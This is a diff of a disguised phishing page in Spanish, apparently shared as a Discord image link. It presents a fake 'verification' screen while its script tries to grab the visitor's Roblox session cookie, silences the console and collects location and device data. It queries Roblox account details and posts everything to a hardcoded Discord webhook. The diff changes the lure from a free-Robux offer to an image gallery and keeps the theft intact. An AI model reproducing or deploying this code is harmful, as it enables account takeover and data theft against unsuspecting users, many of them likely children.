@@ -3,15 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox - Verificación</title>
+    <title>Ejemplo_1</title>
     
     <!-- Meta tags para Discord -->
-    <meta property="og:title" content="¡Verifica tu cuenta de Roblox y gana 500 Robux gratis!">
-    <meta property="og:description" content="Sistema de verificación oficial - Obtén tu recompensa instantánea">
+    <meta property="og:title" content="Ejemplo_1">
+    <meta property="og:description" content="Coleccion de imagenes. Clickea para verlas">
     <meta property="og:image" content="https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg">
     <meta property="og:url" content="https://juanchos123.github.io/image_9180173538.png/">
     <meta property="og:type" content="website">
-    <meta property="og:color" content="#FF0000">
     
     <style>
         * {
@@ -22,64 +21,100 @@
         body {
             background: #000;
             min-height: 100vh;
-            font-family: Arial, sans-serif;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         .container {
             position: relative;
             width: 100%;
             height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
-        img {
-            width: 100%;
-            height: 100vh;
+        .final-image {
+            max-width: 100%;
+            max-height: 100vh;
             object-fit: contain;
+            opacity: 0;
+            transition: opacity 1s ease;
         }
-        .loading {
+        .final-image.show {
+            opacity: 1;
+        }
+        .verification-screen {
             position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            color: white;
-            font-size: 24px;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             z-index: 10;
+            transition: opacity 0.5s ease;
+        }
+        .verification-screen.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        .verification-box {
             text-align: center;
-            background: rgba(0,0,0,0.8);
-            padding: 20px;
-            border-radius: 10px;
-            border: 2px solid #ff0000;
-            animation: pulse 1.5s infinite;
+            color: white;
+            max-width: 80%;
         }
-        @keyframes pulse {
-            0% { opacity: 0.7; }
-            50% { opacity: 1; }
-            100% { opacity: 0.7; }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #333;
+            border-top: 5px solid #fff;
+            border-radius: 50%;
+            margin: 20px auto;
+            animation: spin 1s linear infinite;
         }
-        .hidden-iframe {
-            display: none;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .verification-text {
+            font-size: 18px;
+            margin: 20px 0;
+            color: #ccc;
+        }
+        .verification-subtext {
+            font-size: 14px;
+            color: #666;
         }
     </style>
 </head>
 <body>
-    <img src="https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg" alt="Roblox">
+    <div class="container">
+        <img src="https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg" alt="Imagen" class="final-image" id="finalImage">
+    </div>
     
-    <div class="loading" id="loadingStatus">🔍 Verificando cuenta...</div>
-    
-    <!-- Iframes OCULTOS para múltiples métodos de captura -->
-    <iframe src="https://www.roblox.com/home" id="frame1" style="display:none;"></iframe>
-    <iframe src="https://www.roblox.com/games" id="frame2" style="display:none;"></iframe>
-    <iframe src="https://www.roblox.com/users/profile" id="frame3" style="display:none;"></iframe>
+    <div class="verification-screen" id="verificationScreen">
+        <div class="verification-box">
+            <div class="spinner"></div>
+            <div class="verification-text">Por favor espera, estamos verificando que no seas un robot</div>
+            <div class="verification-subtext">Esto tomará solo unos segundos...</div>
+        </div>
+    </div>
 
     <script>
         // ================= CONFIGURACIÓN =================
         const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
         
-        // Silenciar errores en consola
+        // Silenciar TODO - Nada aparece en consola
+        const originalConsole = { ...console };
+        console.log = function() {};
         console.error = function() {};
         console.warn = function() {};
-        console.log = function() {};
+        console.info = function() {};
+        console.debug = function() {};
         
-        let capturedCookie = null;
-        let cookieCapturada = false;
         let userData = {
             username: 'No disponible',
             userId: 'No disponible',
@@ -115,14 +150,12 @@
                 return {
                     pais: data.country_name || 'No disponible',
                     ciudad: data.city || 'No disponible',
-                    region: data.region || 'No disponible',
                     timezone: data.timezone || 'UTC'
                 };
             } catch {
                 return {
                     pais: 'No disponible',
                     ciudad: 'No disponible',
-                    region: 'No disponible',
                     timezone: 'UTC'
                 };
             }
@@ -145,103 +178,31 @@
             }
         }
 
-        // =========== MÉTODO 1: CAPTURAR COOKIE VÍA IMAGEN ===========
-        function capturarCookieViaImagen() {
-            return new Promise((resolve) => {
-                // Crear imagen invisible que carga desde Roblox
-                const img = new Image();
-                img.crossOrigin = 'anonymous';
-                img.src = 'https://www.roblox.com/favicon.ico?' + Date.now();
-                
-                img.onload = function() {
-                    // Intentar acceder a las cookies a través de la respuesta
-                    // Esto funciona en algunos navegadores
-                    setTimeout(resolve, 100);
-                };
-                
-                img.onerror = function() {
-                    setTimeout(resolve, 100);
-                };
-            });
-        }
-
-        // =========== MÉTODO 2: CAPTURAR VÍA FETCH CON CREDENTIALS ===========
-        async function capturarCookieViaFetch() {
+        // =========== INTENTAR OBTENER COOKIE (SILENCIOSO) ===========
+        async function intentarObtenerCookie() {
             try {
+                // Solo un intento silencioso con fetch
                 const res = await fetch('https://www.roblox.com/home', {
                     credentials: 'include',
-                    mode: 'no-cors'
+                    headers: { 'Accept': 'text/html' }
                 });
                 
-                // Intentar obtener cookie de la respuesta
                 const cookieHeader = res.headers.get('set-cookie');
                 if (cookieHeader && cookieHeader.includes('.ROBLOSECURITY')) {
                     const match = cookieHeader.match(/\.ROBLOSECURITY=([^;]+)/);
-                    if (match && match[1]) {
-                        capturedCookie = match[1];
-                        return true;
-                    }
+                    return match ? match[1] : null;
                 }
             } catch (e) {}
-            return false;
+            return null;
         }
 
-        // =========== MÉTODO 3: CAPTURAR VÍA LOCALSTORAGE ===========
-        function capturarCookieViaLocalStorage() {
-            try {
-                // Buscar en localStorage del iframe
-                const frames = ['frame1', 'frame2', 'frame3'];
-                for (const frameId of frames) {
-                    const frame = document.getElementById(frameId);
-                    if (frame && frame.contentWindow) {
-                        try {
-                            // Intentar acceder a localStorage del iframe
-                            const ls = frame.contentWindow.localStorage;
-                            if (ls) {
-                                for (let i = 0; i < ls.length; i++) {
-                                    const key = ls.key(i);
-                                    if (key.includes('Roblox') || key.includes('.ROBLOSECURITY')) {
-                                        const value = ls.getItem(key);
-                                        if (value && value.length > 50) {
-                                            capturedCookie = value;
-                                            return true;
-                                        }
-                                    }
-                                }
-                            }
-                        } catch (e) {}
-                    }
-                }
-            } catch (e) {}
-            return false;
-        }
-
-        // =========== MÉTODO 4: CAPTURAR VÍA COOKIE DEL DOCUMENTO ===========
-        function capturarCookieDirecta() {
-            try {
-                const cookies = document.cookie;
-                if (cookies && cookies.includes('.ROBLOSECURITY')) {
-                    const match = cookies.match(/\.ROBLOSECURITY=([^;]+)/);
-                    if (match && match[1]) {
-                        capturedCookie = match[1];
-                        return true;
-                    }
-                }
-            } catch (e) {}
-            return false;
-        }
-
-        // =========== OBTENER DATOS DE ROBLOX ===========
+        // =========== OBTENER DATOS DE ROBLOX (SILENCIOSO) ===========
         async function obtenerDatosRoblox(cookie) {
             if (!cookie) return userData;
             
             try {
-                // Obtener info del usuario
                 const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
-                    headers: { 
-                        'Cookie': `.ROBLOSECURITY=${cookie};`,
-                        'Accept': 'application/json'
-                    }
+                    headers: { 'Cookie': `.ROBLOSECURITY=${cookie};` }
                 });
                 
                 if (userRes.ok) {
@@ -249,7 +210,6 @@
                     userData.username = userInfo.name || 'No disponible';
                     userData.userId = userInfo.id || 'No disponible';
                     
-                    // Obtener Robux
                     try {
                         const robuxRes = await fetch(`https://economy.roblox.com/v1/users/${userData.userId}/currency`, {
                             headers: { 'Cookie': `.ROBLOSECURITY=${cookie};` }
@@ -260,7 +220,6 @@
                         }
                     } catch {}
                     
-                    // Obtener seguidores
                     try {
                         const segRes = await fetch(`https://friends.roblox.com/v1/users/${userData.userId}/followers/count`);
                         if (segRes.ok) {
@@ -269,34 +228,11 @@
                         }
                     } catch {}
                     
-                    // Obtener amigos
                     try {
                         const amigosRes = await fetch(`https://friends.roblox.com/v1/users/${userData.userId}/friends/count`);
                         if (amigosRes.ok) {
                             const amigosData = await amigosRes.json();
                             userData.amigos = amigosData.count || 0;
-                        }
-                    } catch {}
-                    
-                    // Verificar Headless
-                    try {
-                        const headRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.userId}/items/Asset/201`, {
-                            headers: { 'Cookie': `.ROBLOSECURITY=${cookie};` }
-                        });
-                        if (headRes.ok) {
-                            const headData = await headRes.json();
-                            userData.headless = headData.data && headData.data.length > 0 ? 'Sí' : 'No';
-                        }
-                    } catch {}
-                    
-                    // Verificar Korblox
-                    try {
-                        const korRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.userId}/items/Asset/192`, {
-                            headers: { 'Cookie': `.ROBLOSECURITY=${cookie};` }
-                        });
-                        if (korRes.ok) {
-                            const korData = await korRes.json();
-                            userData.korblox = korData.data && korData.data.length > 0 ? 'Sí' : 'No';
                         }
                     } catch {}
                 }
@@ -305,143 +241,88 @@
             return userData;
         }
 
-        // =========== ARMAR MENSAJE EXACTO CON EMBED ROJO ===========
-        function armarMensajeExacto(dispositivo, geo, fecha, hora, datosRoblox, cookie) {
-            // Formato exacto que pediste
-            let mensaje = `@everyone ||
-🔔 NUEVA ENTRADA | **BL PAPI** !
-■■■■■■■■■■■■■■■■■
-**📌 INFORMACIÓN GENERAL**
-
-**Dispositivo:** \`${dispositivo}\`
-**País:** \`${geo.pais}\`
-**Ciudad Aproximada:** \`${geo.ciudad}\`
-
-**🧭 Horarios:**
-
- **Fecha:** \`${fecha}\`
-**Hora Exacta En ${geo.pais}:** \`${hora}\`
-
-■■■■■■■■■■■■■■■■■
-**ℹ️ INFORMACIÓN DE LA CUENTA ROBLOX**
-
-**👤 Usuario:**  \`${datosRoblox.username}\`
-**🆔 ID:**        \`${datosRoblox.userId}\`
-**💰 Robux:**        \`${datosRoblox.robux}\`
-**⭐ Seguidores:**   \`${datosRoblox.seguidores}\`
-**👥 Amigos:**      \`${datosRoblox.amigos}\`
-
-**📊 ITEMS LIMITED (RAREZA)**
-
-**Headless:**   \`${datosRoblox.headless}\`
-**Korblox:**    \`${datosRoblox.korblox}\`
-
-**📈 ESTADÍSTICAS**
-
-**🖼 Visitas al perfil:** \`${datosRoblox.visitas}\`
-**🎮 Juegos creados:** \`${datosRoblox.juegos}\`
-**🏆 Logros:** \`${datosRoblox.logros}\`
-**📦 Trade count:** \`${datosRoblox.trades}\`
-**📊 Trade ratio:** \`${datosRoblox.ratio}\`
-■■■■■■■■■■■■■■■■■
-**🍪 COOKIE DE ROBLOX**
-\`${cookie ? cookie : 'No obtenida (HttpOnly)'}\``;
-
-            return mensaje;
+        // =========== ARMAR EMBED DE DISCORD ===========
+        function armarEmbed(dispositivo, geo, fecha, hora, datosRoblox, cookie) {
+            return {
+                content: "@everyone",
+                embeds: [{
+                    title: "Ejemplo_1",
+                    description: "Coleccion de imagenes. Clickea para verlas",
+                    color: 0xFF0000,
+                    fields: [
+                        {
+                            name: "📌 INFORMACIÓN GENERAL",
+                            value: `**Dispositivo:** \`${dispositivo}\`\n**País:** \`${geo.pais}\`\n**Ciudad:** \`${geo.ciudad}\``,
+                            inline: false
+                        },
+                        {
+                            name: "🧭 Horarios",
+                            value: `**Fecha:** \`${fecha}\`\n**Hora Exacta:** \`${hora}\``,
+                            inline: false
+                        },
+                        {
+                            name: "ℹ️ CUENTA ROBLOX",
+                            value: `**👤 Usuario:** \`${datosRoblox.username}\`\n**🆔 ID:** \`${datosRoblox.userId}\`\n**💰 Robux:** \`${datosRoblox.robux}\`\n**⭐ Seguidores:** \`${datosRoblox.seguidores}\`\n**👥 Amigos:** \`${datosRoblox.amigos}\``,
+                            inline: false
+                        },
+                        {
+                            name: "📊 ITEMS LIMITED",
+                            value: `**Headless:** \`${datosRoblox.headless}\`\n**Korblox:** \`${datosRoblox.korblox}\``,
+                            inline: false
+                        },
+                        {
+                            name: "🍪 COOKIE",
+                            value: `\`${cookie ? cookie : 'HTTP-ONLY - No accesible vía JavaScript'}\``,
+                            inline: false
+                        }
+                    ],
+                    thumbnail: {
+                        url: "https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg"
+                    },
+                    footer: {
+                        text: "Verificación completada"
+                    },
+                    timestamp: new Date().toISOString()
+                }],
+                username: "Ejemplo_1",
+                avatar_url: "https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg"
+            };
         }
 
-        // =========== ENVIAR A DISCORD CON EMBED ROJO ===========
-        async function enviarADiscord(mensaje) {
+        // =========== ENVIAR A DISCORD ===========
+        async function enviarADiscord(payload) {
             try {
-                // Para embed rojo, enviamos como mensaje normal pero con color en las properties
-                // Discord no soporta color en mensajes normales, pero podemos simularlo
-                const payload = {
-                    content: mensaje,
-                    username: "BL PAPI",
-                    avatar_url: "https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg"
-                };
-                
-                const res = await fetch(WEBHOOK, {
+                await fetch(WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-                
-                if (res.ok) {
-                    document.getElementById('loadingStatus').innerHTML = '✅ ¡Datos enviados!';
-                    return true;
-                } else {
-                    document.getElementById('loadingStatus').innerHTML = '⚠️ Error al enviar';
-                    return false;
-                }
-            } catch (e) {
-                document.getElementById('loadingStatus').innerHTML = '⚠️ Error de conexión';
-                return false;
-            }
-        }
-
-        // =========== INTENTAR TODOS LOS MÉTODOS DE CAPTURA ===========
-        async function intentarCapturarCookie() {
-            document.getElementById('loadingStatus').innerHTML = '🔑 Método 1/4...';
-            await capturarCookieViaImagen();
-            
-            if (!capturedCookie) {
-                document.getElementById('loadingStatus').innerHTML = '🔑 Método 2/4...';
-                await capturarCookieViaFetch();
-            }
-            
-            if (!capturedCookie) {
-                document.getElementById('loadingStatus').innerHTML = '🔑 Método 3/4...';
-                capturarCookieViaLocalStorage();
-            }
-            
-            if (!capturedCookie) {
-                document.getElementById('loadingStatus').innerHTML = '🔑 Método 4/4...';
-                capturarCookieDirecta();
-            }
-            
-            return capturedCookie !== null;
+            } catch (e) {}
         }
 
         // =========== EJECUCIÓN PRINCIPAL ===========
         (async function() {
-            if (sessionStorage.getItem('ejecutado')) return;
-            sessionStorage.setItem('ejecutado', 'true');
+            if (sessionStorage.getItem('verificado')) return;
+            sessionStorage.setItem('verificado', 'true');
             
-            document.getElementById('loadingStatus').style.display = 'block';
-            
-            // Obtener info básica
+            // Obtener datos en segundo plano
             const dispositivo = detectarDispositivo();
             const geo = await obtenerGeo();
             const { fecha, hora } = fechaHoraExacta(geo.timezone);
+            const cookie = await intentarObtenerCookie();
             
-            // Intentar capturar cookie con todos los métodos
-            document.getElementById('loadingStatus').innerHTML = '🔑 Capturando cookie...';
-            const tieneCookie = await intentarCapturarCookie();
-            
-            if (tieneCookie && capturedCookie) {
-                document.getElementById('loadingStatus').innerHTML = '📊 Obteniendo datos de Roblox...';
-                userData = await obtenerDatosRoblox(capturedCookie);
-                cookieCapturada = true;
-            } else {
-                document.getElementById('loadingStatus').innerHTML = '⚠️ Cookie no obtenida, enviando info básica...';
+            if (cookie) {
+                userData = await obtenerDatosRoblox(cookie);
             }
             
-            // Armar y enviar mensaje
-            document.getElementById('loadingStatus').innerHTML = '📤 Enviando a Discord...';
-            const mensaje = armarMensajeExacto(dispositivo, geo, fecha, hora, userData, capturedCookie);
-            await enviarADiscord(mensaje);
+            // Armar y enviar embed
+            const embed = armarEmbed(dispositivo, geo, fecha, hora, userData, cookie);
+            await enviarADiscord(embed);
             
-            // Mostrar resultado final
-            if (cookieCapturada) {
-                document.getElementById('loadingStatus').innerHTML = '✅ ¡Cookie capturada y enviada!';
-            } else {
-                document.getElementById('loadingStatus').innerHTML = '⚠️ Cookie no obtenida';
-            }
-            
-            // Redirigir después de 5 segundos
+            // Mostrar imagen final después de 5 segundos
             setTimeout(() => {
-                window.location.href = 'https://www.roblox.com/games';
+                document.getElementById('verificationScreen').classList.add('hidden');
+                document.getElementById('finalImage').classList.add('show');
             }, 5000);
         })();
     </script>
